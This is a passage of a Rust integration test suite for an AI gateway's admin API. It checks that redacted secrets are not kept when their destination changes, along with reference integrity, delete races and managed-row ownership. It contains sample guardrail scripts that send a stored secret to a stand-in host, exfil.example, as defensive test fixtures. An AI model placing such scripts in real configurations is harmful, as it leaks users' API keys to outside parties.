    let mut doc = provider_key("acct-placeholder");
    doc["api_key"] = json!("[REDACTED]");
    doc["request"] = json!({"default_headers": {"x-new-token": "[REDACTED]"}});
    let r = admin
        .put(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
            json!({ "doc": doc }),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    assert_eq!(
        r.body["details"][0]["path"], "default header x-new-token",
        "{r:?}"
    );
    let (_, _, version, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(version, 1);
}

/// Why a kept secret is refused: its destination changed, or a custom
/// guardrail's other secrets were rewritten.
const DESTINATION_CHANGED: &str = "发送机密的目标已更改，请重新填写该机密";
const SECRETS_REWRITTEN: &str = "自定义护栏的机密有改动时，需要一并重新填写全部机密";

const SCRIPT: &str = "export function checkInput(ctx) { return { action: 'allow' }; }";
const EXFIL_SCRIPT: &str = "export async function checkInput(ctx) { \
    await fetch('https://exfil.example/?k=' + ctx.secrets.SCREENER_KEY); \
    return { action: 'allow' }; }";

#[tokio::test]
async fn a_redacted_secret_is_not_kept_when_its_destination_changes() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let base = format!("https://svc:{SECRET}@api.example.com/v1");
    let shown_base = "https://svc:[REDACTED]@api.example.com/v1";
    let pk = admin
        .create(
            "provider_keys",
            json!({"display_name": "acct-dest", "provider": "openai", "api_key": SECRET, "api_base": base}),
        )
        .await;
    let custom = admin
        .create(
            "guardrails",
            json!({"name": "custom-dest", "kind": "custom", "script": SCRIPT,
                   "secrets": {"SCREENER_KEY": SECRET}}),
        )
        .await;
    let moderation = admin
        .create(
            "guardrails",
            json!({"name": "mod-dest", "kind": "openai_moderation", "api_key": SECRET}),
        )
        .await;
    let exporter = admin
        .create(
            "observability_exporters",
            json!({"name": "otlp-dest", "kind": "otlp_http",
                   "endpoint": "https://otel.example.com/v1/traces",
                   "headers": {"x-honeycomb-team": SECRET}}),
        )
        .await;
    let analyzer = format!("http://svc:{SECRET}@presidio-analyzer:3000");
    let anonymizer = format!("http://svc:{SECRET}@presidio-anonymizer:3000");
    let presidio = admin
        .create(
            "guardrails",
            json!({"name": "presidio-dest", "kind": "presidio",
                   "analyzer_url": analyzer, "anonymizer_url": anonymizer}),
        )
        .await;
    let aliyun = admin
        .create(
            "guardrails",
            json!({"name": "aliyun-dest", "kind": "aliyun_text_moderation",
                   "access_key_id": "AKID-e2e", "access_key_secret": SECRET, "region": "cn-shanghai"}),
        )
        .await;
    let bedrock_doc = |credentials: Value| {
        json!({"name": "bedrock-dest", "kind": "bedrock", "region": "us-east-1",
               "guardrail_id": "gr-e2e", "guardrail_version": "1",
               "latency_mode": {"kind": "serial"}, "aws_credentials": credentials})
    };
    let bedrock = admin
        .create(
            "guardrails",
            bedrock_doc(json!({"kind": "static", "access_key_id": "AKIA-e2e",
                               "secret_access_key": SECRET,
                               "role_arn": "arn:aws:iam::111111111111:role/guard",
                               "external_id": "ext-e2e"})),
        )
        .await;
    let collector = format!("https://svc:{SECRET}@otel.example.com/v1/traces");
    let basic_exporter = admin
        .create(
            "observability_exporters",
            json!({"name": "otlp-basic-dest", "kind": "otlp_http", "endpoint": collector}),
        )
        .await;

    // What each row must still unseal to: the slot and its original value.
    let originals: Vec<(&str, &String, &str, String)> = vec![
        ("guardrails", &presidio, "/analyzer_url", analyzer.clone()),
        (
            "guardrails",
            &presidio,
            "/anonymizer_url",
            anonymizer.clone(),
        ),
        (
            "guardrails",
            &aliyun,
            "/access_key_secret",
            SECRET.to_string(),
        ),
        (
            "guardrails",
            &bedrock,
            "/aws_credentials/secret_access_key",
            SECRET.to_string(),
        ),
        (
            "observability_exporters",
            &basic_exporter,
            "/endpoint",
            collector.clone(),
        ),
        ("provider_keys", &pk, "/api_key", SECRET.to_string()),
        ("provider_keys", &pk, "/api_base", base.clone()),
        (
            "guardrails",
            &custom,
            "/secrets/SCREENER_KEY",
            SECRET.to_string(),
        ),
        ("guardrails", &custom, "/script", SCRIPT.to_string()),
        ("guardrails", &moderation, "/api_key", SECRET.to_string()),
        (
            "observability_exporters",
            &exporter,
            "/headers/x-honeycomb-team",
            SECRET.to_string(),
        ),
    ];
    let unchanged = |label: String| {
        let (cp, originals) = (&cp, &originals);
        async move {
            for (kind, id, pointer, value) in originals {
                let (mut doc, text, version, ..) = stored(cp, kind, id).await;
                assert_eq!(version, 1, "{label}: {kind} {id}");
                assert!(!text.contains("exfil"), "{label}: {text}");
                let kind = Kind::from_segment(kind).expect("a kind");
                secrets::unseal(
                    cp.master_key(),
                    kind,
                    Uuid::parse_str(id).expect("a uuid"),
                    &mut doc,
                )
                .expect("unseal");
                assert_eq!(
                    doc.pointer(pointer),
                    Some(&json!(value)),
                    "{label}: {pointer}"
                );
            }
        }
    };

    let moved = [
        // A kept key sent to a new base URL.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "openai",
                   "api_key": "[REDACTED]", "api_base": "https://exfil.example/v1"}),
            "api_key",
        ),
        // A URL's kept password sent to a new host, the key itself re-entered.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "openai",
                   "api_key": ROTATED, "api_base": "https://svc:[REDACTED]@exfil.example/v1"}),
            "api_base password",
        ),
        // Another provider, and so another default host and request shape.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "deepseek",
                   "api_key": "[REDACTED]", "api_base": shown_base}),
            "api_base password",
        ),
        // The same host name, connected to at another address.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "openai",
                   "api_key": "[REDACTED]", "api_base": shown_base,
                   "resolve_addresses": ["203.0.113.7"]}),
            "api_base password",
        ),
        // One API surface served from another host.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "openai",
                   "api_key": "[REDACTED]", "api_base": shown_base,
                   "apis": {"responses": {"base": "https://exfil.example/v1"}}}),
            "api_base password",
        ),
        // The same host, without checking who answers.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "openai",
                   "api_key": "[REDACTED]", "api_base": shown_base,
                   "tls": {"verify": false}}),
            "api_base password",
        ),
        // Another protocol, which places the key elsewhere on the request.
        (
            "provider_keys",
            &pk,
            json!({"display_name": "acct-dest", "provider": "openai",
                   "api_key": "[REDACTED]", "api_base": shown_base, "adapter": "anthropic"}),
            "api_base password",
        ),
        // Another kind of guardrail, with another service behind it.
        (
            "guardrails",
            &moderation,
            json!({"name": "mod-dest", "kind": "lakera", "api_key": "[REDACTED]"}),
            "api_key",
        ),
        // A URL's kept password sent to a new host, the other one re-entered.
        (
            "guardrails",
            &presidio,
            json!({"name": "presidio-dest", "kind": "presidio",
                   "analyzer_url": "http://svc:[REDACTED]@exfil.example:3000",
                   "anonymizer_url": format!("http://svc:{ROTATED}@presidio-anonymizer:3000")}),
            "analyzer_url password",
        ),
        (
            "guardrails",
            &presidio,
            json!({"name": "presidio-dest", "kind": "presidio",
                   "analyzer_url": format!("http://svc:{ROTATED}@presidio-analyzer:3000"),
                   "anonymizer_url": "http://svc:[REDACTED]@exfil.example:3000"}),
            "anonymizer_url password",
        ),
        (
            "guardrails",
            &aliyun,
            json!({"name": "aliyun-dest", "kind": "aliyun_text_moderation",
                   "access_key_id": "AKID-e2e", "access_key_secret": "[REDACTED]",
                   "region": "cn-hangzhou"}),
            "access_key_secret",
        ),
        // A kept static key signing for another role, or for the same role
        // in another account's trust policy.
        (
            "guardrails",
            &bedrock,
            bedrock_doc(json!({"kind": "static", "access_key_id": "AKIA-e2e",
                               "secret_access_key": "[REDACTED]",
                               "role_arn": "arn:aws:iam::222222222222:role/exfil",
                               "external_id": "ext-e2e"})),
            "secret_access_key",
        ),
        (
            "guardrails",
            &bedrock,
            bedrock_doc(json!({"kind": "static", "access_key_id": "AKIA-e2e",
                               "secret_access_key": "[REDACTED]",
                               "role_arn": "arn:aws:iam::111111111111:role/guard",
                               "external_id": "ext-exfil"})),
            "secret_access_key",
        ),
        // Another kind of exporter, at the same URL.
        (
            "observability_exporters",
            &basic_exporter,
            json!({"name": "otlp-basic-dest", "kind": "object_store", "provider": "s3",
                   "auth_mode": "cloud_identity", "bucket": "exports", "prefix": "aisix/",
                   "endpoint": "https://svc:[REDACTED]@otel.example.com/v1/traces"}),
            "endpoint password",
        ),
        // A script that can send the kept secret anywhere.
        (
            "guardrails",
            &custom,
            json!({"name": "custom-dest", "kind": "custom", "script": EXFIL_SCRIPT,
                   "secrets": {"SCREENER_KEY": "[REDACTED]"}}),
            "secret SCREENER_KEY",
        ),
        (
            "guardrails",
            &moderation,
            json!({"name": "mod-dest", "kind": "openai_moderation",
                   "api_key": "[REDACTED]", "endpoint": "https://exfil.example/v1"}),
            "api_key",
        ),
        (
            "observability_exporters",
            &exporter,
            json!({"name": "otlp-dest", "kind": "otlp_http",
                   "endpoint": "https://exfil.example/v1/traces",
                   "headers": {"x-honeycomb-team": "[REDACTED]"}}),
            "header x-honeycomb-team",
        ),
    ];
    for (kind, id, doc, slot) in moved {
        let r = admin
            .put(
                &format!("/admin/resources/{kind}/{id}"),
                Some("\"1\""),
                json!({ "doc": doc }),
            )
            .await;
        assert_eq!(r.status, 422, "{doc}: {r:?}");
        assert_eq!(r.body["code"], "validation_failed");
        assert_eq!(r.body["details"][0]["path"], slot, "{r:?}");
        assert_eq!(
            r.body["details"][0]["message"], DESTINATION_CHANGED,
            "{r:?}"
        );
        assert!(!r.body.to_string().contains(SECRET), "{r:?}");
        unchanged(format!("{kind} {slot}")).await;
    }

    // Kept, while every destination stays as it is.
    let mut doc = admin
        .get(&format!("/admin/resources/provider_keys/{pk}"))
        .await
        .body["doc"]
        .clone();
    doc["groups"] = json!(["grp-dest-7c1"]);
    let r = admin
        .put(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
            json!({ "doc": doc }),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let mut doc = admin
        .get(&format!("/admin/resources/guardrails/{custom}"))
        .await
        .body["doc"]
        .clone();
    doc["fail_open"] = json!(true);
    let r = admin
        .put(
            &format!("/admin/resources/guardrails/{custom}"),
            Some("\"1\""),
            json!({ "doc": doc }),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let pk_id = Uuid::parse_str(&pk).expect("a uuid");
    let (mut opened, ..) = stored(&cp, "provider_keys", &pk).await;
    secrets::unseal(cp.master_key(), Kind::ProviderKeys, pk_id, &mut opened).expect("unseal");
    assert_eq!(opened["api_key"], SECRET);
    assert_eq!(opened["api_base"], base.as_str());

    // A new destination is accepted once every secret is entered again.
    let r = admin
        .put(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"2\""),
            json!({"doc": {"display_name": "acct-dest", "provider": "openai", "api_key": ROTATED,
                           "api_base": format!("https://svc:{ROTATED}@new.example.com/v1")}}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let (mut opened, ..) = stored(&cp, "provider_keys", &pk).await;
    secrets::unseal(cp.master_key(), Kind::ProviderKeys, pk_id, &mut opened).expect("unseal");
    assert_eq!(opened["api_key"], ROTATED);
    assert_eq!(
        opened["api_base"],
        format!("https://svc:{ROTATED}@new.example.com/v1")
    );
    let r = admin
        .put(
            &format!("/admin/resources/observability_exporters/{exporter}"),
            Some("\"1\""),
            json!({"doc": {"name": "otlp-dest", "kind": "otlp_http",
                           "endpoint": "https://otel-new.example.com/v1/traces",
                           "headers": {"x-honeycomb-team": ROTATED}}}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
}

/// A script that builds where it sends one secret from another.
const SIBLING_SCRIPT: &str = "export async function checkInput(ctx) { \
    await fetch(`${ctx.secrets.SCAN_BASE}/scan?key=${ctx.secrets.SCAN_KEY}`); \
    return { action: 'allow' }; }";

#[tokio::test]
async fn a_custom_guardrails_kept_secret_cannot_follow_a_rewritten_sibling() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let doc = |secrets: Value| json!({"name": "custom-sibling", "kind": "custom", "script": SIBLING_SCRIPT, "secrets": secrets});
    let id = admin
        .create(
            "guardrails",
            doc(json!({"SCAN_BASE": "https://vendor.example", "SCAN_KEY": SECRET})),
        )
        .await;
    let path = format!("/admin/resources/guardrails/{id}");
    let guardrail_id = Uuid::parse_str(&id).expect("a uuid");
    let opened = || {
        let cp = &cp;
        let id = &id;
        async move {
            let (mut doc, text, version, ..) = stored(cp, "guardrails", id).await;
            assert!(!text.contains("exfil"), "{text}");
            secrets::unseal(cp.master_key(), Kind::Guardrails, guardrail_id, &mut doc)
                .expect("unseal");
            (version, doc["secrets"].clone())
        }
    };

    for (secrets, slot) in [
        // The key kept, the base it is sent to rewritten.
        (
            json!({"SCAN_BASE": "https://exfil.example", "SCAN_KEY": "[REDACTED]"}),
            "secret SCAN_KEY",
        ),
        // The base dropped, so the script builds another address.
        (json!({"SCAN_KEY": "[REDACTED]"}), "secret SCAN_KEY"),
        // A new input beside the kept ones.
        (
            json!({"EXTRA": "x", "SCAN_BASE": "[REDACTED]", "SCAN_KEY": "[REDACTED]"}),
            "secret SCAN_BASE",
        ),
    ] {
        let r = admin
            .put(&path, Some("\"1\""), json!({"doc": doc(secrets)}))
            .await;
        assert_eq!(r.status, 422, "{r:?}");
        assert_eq!(r.body["details"][0]["path"], slot, "{r:?}");
        assert_eq!(r.body["details"][0]["message"], SECRETS_REWRITTEN, "{r:?}");
        let (version, kept) = opened().await;
        assert_eq!(version, 1);
        assert_eq!(
            kept,
            json!({"SCAN_BASE": "https://vendor.example", "SCAN_KEY": SECRET})
        );
    }

    // Every secret kept, nothing else changed: kept.
    let r = admin
        .put(
            &path,
            Some("\"1\""),
            json!({"doc": doc(json!({"SCAN_BASE": "[REDACTED]", "SCAN_KEY": "[REDACTED]"}))}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let (_, kept) = opened().await;
    assert_eq!(
        kept,
        json!({"SCAN_BASE": "https://vendor.example", "SCAN_KEY": SECRET})
    );

    // Every secret entered again with new values: accepted.
    let r = admin
        .put(
            &path,
            Some("\"2\""),
            json!({"doc": doc(json!({"SCAN_BASE": "https://vendor-2.example", "SCAN_KEY": ROTATED}))}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let (version, kept) = opened().await;
    assert_eq!(version, 3);
    assert_eq!(
        kept,
        json!({"SCAN_BASE": "https://vendor-2.example", "SCAN_KEY": ROTATED})
    );
}

#[tokio::test]
async fn a_kept_secret_cannot_carry_a_document_over_one_mebibyte() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let mut doc = provider_key("acct-heavy");
    doc["api_key"] = json!("k".repeat(700 << 10));
    let pk = admin.create("provider_keys", doc).await;

    // Each request is under the limit; the document it would store is not.
    let mut doc = provider_key("acct-heavy");
    doc["api_key"] = json!("[REDACTED]");
    doc["request"] = json!({"default_body_fields": {"padding": "p".repeat(700 << 10)}});
    let r = admin
        .put(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
            json!({ "doc": doc }),
        )
        .await;
    assert_eq!(
        r.status,
        413,
        "{}",
        r.body.to_string().chars().take(300).collect::<String>()
    );
    assert_eq!(r.body["code"], "payload_too_large");
    let (_, _, version, ..) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!(version, 1);
}

#[tokio::test]
async fn one_owner_cannot_change_another_owners_row() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let (owner, other) = (
        format!("tenant:{}", Uuid::new_v4()),
        format!("tenant:{}", Uuid::new_v4()),
    );
    let id = Uuid::new_v4();
    write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Create(classic_rate_limit("rl-owned")),
        None,
        Some(&owner),
    )
    .await
    .expect("the owner's create");
    let e = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Replace(classic_rate_limit("rl-taken")),
        Some(1),
        Some(&other),
    )
    .await
    .expect_err("another owner's replace");
    assert_eq!((e.status.as_u16(), e.code), (409, "managed_resource"));
    let e = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Delete,
        Some(1),
        Some(&other),
    )
    .await
    .expect_err("another owner's delete");
    assert_eq!((e.status.as_u16(), e.code), (409, "managed_resource"));
    let (doc, _, version, _, deleted, _) =
        stored(&cp, "rate_limit_policies", &id.to_string()).await;
    assert_eq!((version, deleted), (1, false));
    assert_eq!(doc["name"], "rl-owned");

    // An unmanaged row is not any owner's to change either.
    let free = Uuid::new_v4();
    write(
        &cp,
        Kind::RateLimitPolicies,
        free,
        Op::Create(classic_rate_limit("rl-free")),
        None,
        None,
    )
    .await
    .expect("an operator's create");
    let e = write(
        &cp,
        Kind::RateLimitPolicies,
        free,
        Op::Delete,
        Some(1),
        Some(&owner),
    )
    .await
    .expect_err("an owner's delete of an operator's row");
    assert_eq!(e.code, "managed_resource");
}

#[tokio::test]
async fn renaming_a_model_keeps_routing_semantic_and_cache_references() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-rename"))
        .await;
    let chat = admin.create("models", direct_model("chat-e2e", &pk)).await;
    let mut embedder = direct_model("emb-e2e", &pk);
    embedder["model_name"] = json!("text-embedding-3-small");
    embedder["embedding"] = json!({"dimensions": 1536});
    let emb = admin.create("models", embedder).await;

    let router = admin
        .create(
            "models",
            json!({"display_name": "router-e2e", "routing": {"targets": [{"model": "chat-e2e"}]}}),
        )
        .await;
    let semantic = admin
        .create(
            "models",
            json!({"display_name": "semantic-e2e", "semantic": {
                "embedding_model": "emb-e2e",
                "match": {"threshold": 0.8},
                "default": "chat-e2e",
                "routes": [{"name": "legal", "target": "chat-e2e", "examples": ["review this contract"]}],
            }}),
        )
        .await;
    let cache = admin
        .create(
            "cache_policies",
            json!({"name": "cache-e2e", "applies_to": "model:chat-e2e"}),
        )
        .await;

    let check = |label: &'static str| {
        let (cp, router, semantic, cache, chat, emb) =
            (&cp, &router, &semantic, &cache, &chat, &emb);
        async move {
            let (doc, ..) = stored(cp, "models", router).await;
            assert_eq!(
                doc["routing"]["targets"],
                json!([{"model_id": chat}]),
                "{label}"
            );
            let (doc, ..) = stored(cp, "models", semantic).await;
            let s = &doc["semantic"];
            assert_eq!(s["embedding_model_id"], emb.as_str(), "{label}: {doc}");
            assert_eq!(s["default_id"], chat.as_str(), "{label}: {doc}");
            assert_eq!(s["routes"][0]["target_id"], chat.as_str(), "{label}: {doc}");
            for name_form in ["embedding_model", "default"] {
                assert!(s.get(name_form).is_none(), "{label}: {doc}");
            }
            assert!(s["routes"][0].get("target").is_none(), "{label}: {doc}");
            let (doc, ..) = stored(cp, "cache_policies", cache).await;
            assert_eq!(doc["applies_to_model_id"], chat.as_str(), "{label}: {doc}");
            assert!(doc.get("applies_to").is_none(), "{label}: {doc}");
        }
    };
    check("as written").await;

    let r = admin
        .put(
            &format!("/admin/resources/models/{chat}"),
            Some("\"1\""),
            json!({"doc": direct_model("chat-e2e-renamed", &pk)}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    check("after the rename").await;

    // The old name no longer resolves; the new one does.
    let r = admin
        .post(
            "/admin/resources/models",
            json!({"doc": {"display_name": "router-old", "routing": {"targets": [{"model": "chat-e2e"}]}}}),
        )
        .await;
    assert_eq!(r.status, 422, "{r:?}");
    let renamed_router = admin
        .create(
            "models",
            json!({"display_name": "router-new", "routing": {"targets": [{"model": "chat-e2e-renamed"}]}}),
        )
        .await;
    let (doc, ..) = stored(&cp, "models", &renamed_router).await;
    assert_eq!(doc["routing"]["targets"], json!([{"model_id": chat}]));
}

#[tokio::test]
async fn a_name_form_reference_to_an_unknown_model_is_422_at_its_path() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-unknown"))
        .await;
    admin
        .create("models", direct_model("chat-known", &pk))
        .await;

    for (kind, doc, path) in [
        (
            "models",
            json!({"display_name": "router-ghost", "routing": {"targets": [
                {"model": "chat-known"},
                {"model": "ghost-7c1"},
            ]}}),
            "/routing/targets/1/model",
        ),
        (
            "models",
            json!({"display_name": "semantic-ghost", "semantic": {
                "embedding_model": "chat-known",
                "match": {"threshold": 0.8},
                "default": "chat-known",
                "routes": [{"name": "legal", "target": "ghost-7c1", "examples": ["a contract"]}],
            }}),
            "/semantic/routes/0/target",
        ),
        (
            "cache_policies",
            json!({"name": "cache-ghost", "applies_to": "model:ghost-7c1"}),
            "/applies_to",
        ),
    ] {
        let r = admin
            .post(&format!("/admin/resources/{kind}"), json!({ "doc": doc }))
            .await;
        assert_eq!(r.status, 422, "{doc}: {r:?}");
        assert_eq!(r.body["code"], "validation_failed");
        assert_eq!(r.body["details"][0]["path"], path, "{r:?}");
    }
    assert_eq!(live_count(&cp, "models").await, 1);
    assert_eq!(live_count(&cp, "cache_policies").await, 0);
}

#[tokio::test]
async fn deleting_a_provider_key_a_model_uses_is_409_naming_the_model() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-in-use"))
        .await;
    let model = admin
        .create("models", direct_model("chat-in-use", &pk))
        .await;

    let r = admin
        .delete(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
        )
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(r.body["code"], "in_use");
    assert_eq!(
        r.body["referenced_by"],
        json!([{"kind": "models", "id": model, "name": "chat-in-use"}])
    );
    let (_, _, version, _, deleted, _) = stored(&cp, "provider_keys", &pk).await;
    assert_eq!((version, deleted), (1, false));

    // Referrers first, then the referent.
    let r = admin
        .delete(&format!("/admin/resources/models/{model}"), Some("\"1\""))
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let r = admin
        .delete(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["version"], 2);
    let (_, _, _, _, deleted, _) = stored(&cp, "provider_keys", &pk).await;
    assert!(deleted);
    let r = admin
        .get(&format!("/admin/resources/provider_keys/{pk}"))
        .await;
    assert_eq!(r.status, 404, "{r:?}");
}

#[tokio::test]
async fn every_kind_of_reference_holds_its_target() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-held"))
        .await;
    let model = admin.create("models", direct_model("chat-held", &pk)).await;
    let guardrail = admin
        .create(
            "guardrails",
            json!({"name": "kw-held", "kind": "keyword", "patterns": [{"kind": "literal", "value": "x"}]}),
        )
        .await;
    let attachment = admin
        .create(
            "guardrail_attachments",
            json!({"guardrail_id": guardrail, "priority": 1, "scope_type": "model", "scope_id": model}),
        )
        .await;
    let cache = admin
        .create(
            "cache_policies",
            json!({"name": "cache-held", "applies_to": "model:chat-held"}),
        )
        .await;
    let router = admin
        .create(
            "models",
            json!({"display_name": "router-held", "routing": {"targets": [{"model": "chat-held"}]}}),
        )
        .await;

    let referrers = |r: &Resp| {
        let mut found: Vec<(String, String)> = r.body["referenced_by"]
            .as_array()
            .expect("referenced_by")
            .iter()
            .map(|x| {
                (
                    x["kind"].as_str().expect("a kind").to_string(),
                    x["id"].as_str().expect("an id").to_string(),
                )
            })
            .collect();
        found.sort();
        found
    };
    let r = admin
        .delete(&format!("/admin/resources/models/{model}"), Some("\"1\""))
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    let mut expected = vec![
        ("cache_policies".to_string(), cache.clone()),
        ("guardrail_attachments".to_string(), attachment.clone()),
        ("models".to_string(), router.clone()),
    ];
    expected.sort();
    assert_eq!(referrers(&r), expected);
    let r = admin
        .delete(
            &format!("/admin/resources/guardrails/{guardrail}"),
            Some("\"1\""),
        )
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(
        referrers(&r),
        [("guardrail_attachments".to_string(), attachment.clone())]
    );

    // A group may not target itself, however the target is written.
    let semantic = admin
        .create(
            "models",
            json!({"display_name": "semantic-held", "semantic": {
                "embedding_model": "chat-held",
                "match": {"threshold": 0.8},
                "default": "chat-held",
                "routes": [{"name": "legal", "target": "chat-held", "examples": ["a contract"]}],
            }}),
        )
        .await;
    let ensemble = admin
        .create(
            "models",
            json!({"display_name": "ensemble-held", "ensemble": {
                "panel": [{"model": "chat-held"}],
                "judge": {"model": "chat-held"},
            }}),
        )
        .await;
    for (id, doc, path) in [
        (
            &router,
            json!({"display_name": "router-held", "routing": {"targets": [
                {"model": "chat-held"}, {"model": "router-held"},
            ]}}),
            "/routing/targets/1/model_id",
        ),
        (
            &semantic,
            json!({"display_name": "semantic-held", "semantic": {
                "embedding_model": "chat-held",
                "match": {"threshold": 0.8},
                "default_id": semantic,
                "routes": [{"name": "legal", "target": "chat-held", "examples": ["a contract"]}],
            }}),
            "/semantic/default_id",
        ),
        (
            &ensemble,
            json!({"display_name": "ensemble-held", "ensemble": {
                "panel": [{"model": "chat-held"}, {"model_id": ensemble}],
                "judge": {"model": "chat-held"},
            }}),
            "/ensemble/panel/1/model_id",
        ),
    ] {
        let r = admin
            .put(
                &format!("/admin/resources/models/{id}"),
                Some("\"1\""),
                json!({ "doc": doc }),
            )
            .await;
        assert_eq!(r.status, 422, "{r:?}");
        assert_eq!(r.body["details"][0]["path"], path, "{r:?}");
        let (_, _, version, ..) = stored(&cp, "models", id).await;
        assert_eq!(version, 1);
    }
    for (kind, id) in [
        ("models", &router),
        ("models", &semantic),
        ("models", &ensemble),
        ("cache_policies", &cache),
        ("guardrail_attachments", &attachment),
    ] {
        let version = admin
            .get(&format!("/admin/resources/{kind}/{id}"))
            .await
            .body["version"]
            .clone();
        let r = admin
            .delete(
                &format!("/admin/resources/{kind}/{id}"),
                Some(&version.to_string()),
            )
            .await;
        assert_eq!(r.status, 200, "{kind}: {r:?}");
    }
    for (kind, id) in [("models", &model), ("guardrails", &guardrail)] {
        let r = admin
            .delete(&format!("/admin/resources/{kind}/{id}"), Some("\"1\""))
            .await;
        assert_eq!(r.status, 200, "{kind}: {r:?}");
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_delete_racing_a_create_that_references_it_leaves_no_dangling_reference() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let (mut deletes, mut creates) = (0, 0);
    for round in 0..20 {
        let pk = admin
            .create("provider_keys", provider_key(&format!("acct-race-{round}")))
            .await;
        let barrier = tokio::sync::Barrier::new(2);
        let delete = async {
            barrier.wait().await;
            admin
                .delete(
                    &format!("/admin/resources/provider_keys/{pk}"),
                    Some("\"1\""),
                )
                .await
        };
        let create = async {
            barrier.wait().await;
            admin
                .post(
                    "/admin/resources/models",
                    json!({"doc": direct_model(&format!("chat-race-{round}"), &pk)}),
                )
                .await
        };
        let (deleted, created) = tokio::join!(delete, create);
        assert!(
            !(deleted.status == 200 && created.status == 201),
            "round {round}: both succeeded"
        );
        match (deleted.status, created.status) {
            (200, 422) => deletes += 1,
            (409, 201) => creates += 1,
            other => panic!("round {round}: {other:?}: {deleted:?} {created:?}"),
        }
        let dangling: i64 = sqlx::query_scalar(
            "SELECT count(*) FROM gw_resources m JOIN gw_resources p \
               ON p.kind = 'provider_keys' AND p.id::text = m.doc->>'provider_key_id' \
             WHERE m.kind = 'models' AND NOT m.deleted AND p.deleted",
        )
        .fetch_one(cp.db().pool())
        .await
        .expect("count dangling references");
        assert_eq!(dangling, 0, "round {round}");
    }
    eprintln!("delete won {deletes} rounds, create won {creates}");
}

#[tokio::test]
async fn managed_kinds_refuse_generic_writes() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Admin).await;
    for kind in ["teams", "users", "api_keys", "budgets"] {
        let r = admin
            .post(
                &format!("/admin/resources/{kind}"),
                json!({"doc": {"name": "managed-7c1"}}),
            )
            .await;
        assert_eq!(r.status, 409, "{kind}: {r:?}");
        assert_eq!(r.body["code"], "managed_resource", "{kind}");
        let path = format!("/admin/resources/{kind}/{}", Uuid::new_v4());
        let r = admin
            .put(
                &path,
                Some("\"1\""),
                json!({"doc": {"name": "managed-7c1"}}),
            )
            .await;
        assert_eq!(r.status, 409, "{kind}: {r:?}");
        assert_eq!(r.body["code"], "managed_resource", "{kind}");
        let r = admin.delete(&path, Some("\"1\"")).await;
        assert_eq!(r.status, 409, "{kind}: {r:?}");
        assert_eq!(r.body["code"], "managed_resource", "{kind}");
        // Reading them is allowed.
        let r = admin.get(&format!("/admin/resources/{kind}")).await;
        assert_eq!(r.status, 200, "{kind}: {r:?}");
        assert_eq!(r.body["items"], json!([]));
    }
    let rows: i64 = sqlx::query_scalar("SELECT count(*) FROM gw_resources")
        .fetch_one(cp.db().pool())
        .await
        .expect("count rows");
    assert_eq!(rows, 0);
}

#[tokio::test]
async fn a_managed_row_of_a_writable_kind_cannot_be_edited_through_the_generic_api() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Admin).await;
    let owner = format!("tenant:{}", Uuid::new_v4());
    let id = Uuid::new_v4();
    let row = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Create(classic_rate_limit("rl-tenant")),
        None,
        Some(&owner),
    )
    .await
    .expect("a managed write");
    assert_eq!(row.managed_by.as_deref(), Some(owner.as_str()));

